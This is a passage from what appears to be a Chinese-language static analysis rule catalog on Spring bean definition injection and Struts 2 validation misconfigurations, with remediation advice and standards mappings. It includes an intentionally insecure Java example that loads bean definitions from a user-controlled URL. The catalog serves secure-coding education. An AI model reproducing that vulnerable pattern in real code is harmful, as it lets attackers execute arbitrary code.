<h5 id="EXPLANATION-324"><a href="#EXPLANATION-324" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Spring 可以让开发人员从多个资源加载 Bean 定义，包括本地文件和远程 URL。如果攻击者能够控制 Bean 定义资源的内容，他们则能够注入恶意 Bean 定义，在初始化时执行任意代码。</p>
<p>示例：以下示例从用户控制的位置加载 Bean 定义资源：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String beans = getBeanDefinitionFromUser();</span><br><span class="line"></span><br><span class="line">GenericApplicationContext ctx = new GenericApplicationContext();</span><br><span class="line"></span><br><span class="line">XmlBeanDefinitionReader xmlReader = new XmlBeanDefinitionReader(ctx);</span><br><span class="line"></span><br><span class="line">xmlReader.loadBeanDefinitions(new UrlResource(beans));</span><br><span class="line"></span><br><span class="line">ctx.refresh();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-322"><a href="#RECOMMENDATIONS-322" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不让用户控制 Bean 定义资源的位置。如果确实需要，请设置一些间接方法：创建一份合法资源列表，并且规定用户只能选择其中的资源。通过这种方法，用户就不能直接加载任意 Bean 定义资源了。</p>
<h5 id="REFERENCES-321"><a href="#REFERENCES-321" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 94, CWE ID 95</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 094</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Struts-2-Action-Field-Without-Validator"><a href="#Struts-2-Action-Field-Without-Validator" class="headerlink" title="Struts 2: Action Field Without Validator"></a>Struts 2: Action Field Without Validator</h4><h5 id="ABSTRACT-324"><a href="#ABSTRACT-324" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>发现没有对应验证定义的 Action 字段。</p>
<h5 id="EXPLANATION-325"><a href="#EXPLANATION-325" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>一个或多个 Action 字段没有对应的验证定义。每个字段均应具有一个 ActionClass-validation.xml 中引用的明确验证例程。</p>
<p>当开发人员删除或者重命名 action form 映射后，很容易忘记更新验证逻辑。如果缺少验证器定义，就表明验证逻辑没有得到适当维护。</p>
<p>验证逻辑的维护至关重要，验证逻辑必须与应用程序的其余部分保持同步。未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-323"><a href="#RECOMMENDATIONS-323" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>检查 action 验证文件，并搜索孤立的验证定义的可能匹配项。此搜索结果可能会表明已对 Action 字段重新命名，但没有更新对应的验证。</p>
<p>通过验证逻辑查找是否存在其他或许更难察觉的问题。</p>
<p>－ 如果验证定义以前由一个 action form 映射使用，而这个映射 目前已经删除了，则应删除这个 unused validation form。</p>
<p>－ 如果该 action form 映射已经被重命名，请考虑重命名验证 文件，让它们重新连接起来。</p>
<p>－ 如果旧的 action form 映射中存在的功能已经合并到 另一个 action form 映射中，请检查无用的验证逻辑与新的 验证逻辑之间的一致性。</p>
<h5 id="REFERENCES-322"><a href="#REFERENCES-322" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts2 Validation Framework The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 101</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-2-Duplicate-Action-Field-Validators"><a href="#Struts-2-Duplicate-Action-Field-Validators" class="headerlink" title="Struts 2: Duplicate Action Field Validators"></a>Struts 2: Duplicate Action Field Validators</h4><h5 id="ABSTRACT-325"><a href="#ABSTRACT-325" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>采用同一名称的多个 Struts2 field validator 引用已存在。存在重复的验证器引用表明该验证不是最新的。</p>
<h5 id="EXPLANATION-326"><a href="#EXPLANATION-326" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 ActionClass-validation.xml 中，存在多个采用相同名称的字段验证器定义。若存在同名的重复验证定义，可能导致非预期的行为。</p>
<p>示例： 下列条目显示了两个重复的字段验证器定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;field name=&quot;emailField&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;field-validator type=&quot;email&quot; short-circuit=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;message&gt;You must enter a value for email.&lt;/message&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/field-validator&gt;</span><br><span class="line"></span><br><span class="line">    &lt;field-validator type=&quot;email&quot; short-circuit=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;message&gt;Not a valid e-mail.&lt;/message&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/field-validator&gt;</span><br><span class="line"></span><br><span class="line">&lt;/field&gt;</span><br></pre></td></tr></table></figure>
<p>验证逻辑的维护至关重要，验证逻辑必须与应用程序的其余部分保持同步。未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-324"><a href="#RECOMMENDATIONS-324" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果这是由于命名不当的字段验证器类型造成的，请检查重复的字段验证定义。 确定哪个验证定义最新，并删除所有过时的定义。仔细检查保留下来的 validation form，看有没有其他错误或已经过时的迹象。</p>
<h5 id="REFERENCES-323"><a href="#REFERENCES-323" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts2 Validation Framework The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 101</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-2-Duplicate-Validation-Files"><a href="#Struts-2-Duplicate-Validation-Files" class="headerlink" title="Struts 2: Duplicate Validation Files"></a>Struts 2: Duplicate Validation Files</h4><h5 id="ABSTRACT-326"><a href="#ABSTRACT-326" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>此 Action（操作）存在多个 Struts2 Validation 文件。多个 validation form 暗示着该验证已经过时。</p>
<h5 id="EXPLANATION-327"><a href="#EXPLANATION-327" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>发现此 Struts2 Action 定义存在多个 ActionClass-validation.xml 文件。对以 ActionClass 形式定义的每个 Struts2 Action，Struts2 都会搜索对应的 ActionClass-validation.xml，以获取必要的验证限制。如果部署中的某一 Action（操作）存在多个验证定义，则会导致异常。</p>
<p>如果两个 validation form 具有相同的名称，Struts Validator 会任意选择一个来进行输入验证，而放弃另外一个。这一决策可能不是程序员所期望的。而且，它也暗示着验证逻辑没有得到维护，并暗示着存在其他更难察觉的验证错误。</p>
<p>验证逻辑的维护至关重要，验证逻辑必须与应用程序的其余部分保持同步。未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-325"><a href="#RECOMMENDATIONS-325" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果这是由于错误命名的验证文件造成，则检查重复的验证定义。请确保每个 Action 都有且只有一个使用 Struts2 应用程序部署的对应 ActionClass-validation.xml 文件。 确定哪个 validation form 是最新的，将其他的删除。仔细检查保留下来的 validation form，看有没有其他错误或已经过时的迹象。</p>
<h5 id="REFERENCES-324"><a href="#REFERENCES-324" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts2 Validation Framework The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 101</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-2-Duplicate-Validators"><a href="#Struts-2-Duplicate-Validators" class="headerlink" title="Struts 2: Duplicate Validators"></a>Struts 2: Duplicate Validators</h4><h5 id="ABSTRACT-327"><a href="#ABSTRACT-327" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>采用同一名称的多个 Struts2 validator 引用已存在。存在重复的验证器引用表明该验证不是最新的。</p>
<h5 id="EXPLANATION-328"><a href="#EXPLANATION-328" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 validators.xml 中，发现多个验证器定义。若存在同名的多个验证定义，可能导致非预期的行为。</p>
<p>如果两个 validation class 具有相同的名称，Struts Validator 会任意选择其中一个 validation class 进行输入验证，而放弃另一个。这一决策可能不是程序员所期望的。而且，它也暗示着验证逻辑没有得到维护，并暗示着存在其他更难察觉的验证错误。</p>
<p>验证逻辑的维护至关重要，验证逻辑必须与应用程序的其余部分保持同步。未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-326"><a href="#RECOMMENDATIONS-326" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果这是由于命名不当的引用造成的，请检查重复的验证器定义。确保每个 Action 都有一个且仅有一个使用 Struts2 应用程序进行定义的相应验证器。</p>
<h5 id="REFERENCES-325"><a href="#REFERENCES-325" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts2 Validation Framework The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 101</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-2-Undeclared-Validator"><a href="#Struts-2-Undeclared-Validator" class="headerlink" title="Struts 2: Undeclared Validator"></a>Struts 2: Undeclared Validator</h4><h5 id="ABSTRACT-328"><a href="#ABSTRACT-328" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>ActionClass-validation.xml 中引用的验证器未在 validators.xml 中声明</p>
<h5 id="EXPLANATION-329"><a href="#EXPLANATION-329" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts2 要求先在 validators.xml 中定义自定义的验证器，然后才能在 Action 验证器定义中使用它。缺少验证器定义，将表示该验证不是最新的。</p>
<p>示例： 下列 Action 验证器未在 validators.xml 中定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;validators&gt;</span><br><span class="line"></span><br><span class="line">    &lt;validator name=&quot;required&quot; class=&quot;com.opensymphony.xwork2.validator.validators.RequiredFieldValidator&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/validators&gt;</span><br></pre></td></tr></table></figure>
<p>验证逻辑的维护至关重要，验证逻辑必须与应用程序的其余部分保持同步。未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-327"><a href="#RECOMMENDATIONS-327" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保 ActionClass-validation.xml 中所引用的任何验证器，在 Struts2 validators.xml 配置文件中都有相应的定义。</p>
<h5 id="REFERENCES-326"><a href="#REFERENCES-326" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts2 Validation Framework The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 101</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-2-Unvalidated-Action"><a href="#Struts-2-Unvalidated-Action" class="headerlink" title="Struts 2: Unvalidated Action"></a>Struts 2: Unvalidated Action</h4><h5 id="ABSTRACT-329"><a href="#ABSTRACT-329" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Struts2 Actions 应利用 Struts Validation 框架防止未经检验的输入产生漏洞。</p>
<h5 id="EXPLANATION-330"><a href="#EXPLANATION-330" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 J2EE 应用程序中，未经检验的输入是导致漏洞发生的首要原因。未经检验的输入数据会导致许多漏洞，如 cross-site scripting、process control 和 SQL injection。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<p>为了防止此类攻击，我们应在应用程序处理输入之前，使用 Struts Validation 框架来检验所有的程序输入。使用 Fortify Static Code Analyzer（Fortify 静态代码分析器）来确保您的 Struts Validator 配置中不存在任何漏洞。</p>
<p>验证器在例子中的用法包括检查并确保以下内容：</p>
<ul>
<li><p>在电话号码字段中只包含有效字符</p>
</li>
<li><p>布尔值仅为“T”或者“F”</p>
</li>
<li><p>未限定格式的字符串必须具有合理的长度，并且由有效的字符组成</p>
</li>
</ul>
<h5 id="RECOMMENDATIONS-328"><a href="#RECOMMENDATIONS-328" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为对应的 Action（操作）定义 Struts Validator。以下示例说明了一种典型的“ActionClass-validation.xml”设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;validators&gt;</span><br><span class="line"></span><br><span class="line">  &lt;field name=&quot;user.firstName&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;field-validator type=&quot;requiredstring&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;message key=&quot;user.firstName.empty&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/field-validator&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/field&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>配置文件 ActionClass-validation.xml 包含了对验证函数（称为验证器）的定义。</p>
<h5 id="REFERENCES-327"><a href="#REFERENCES-327" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts Project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 101</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
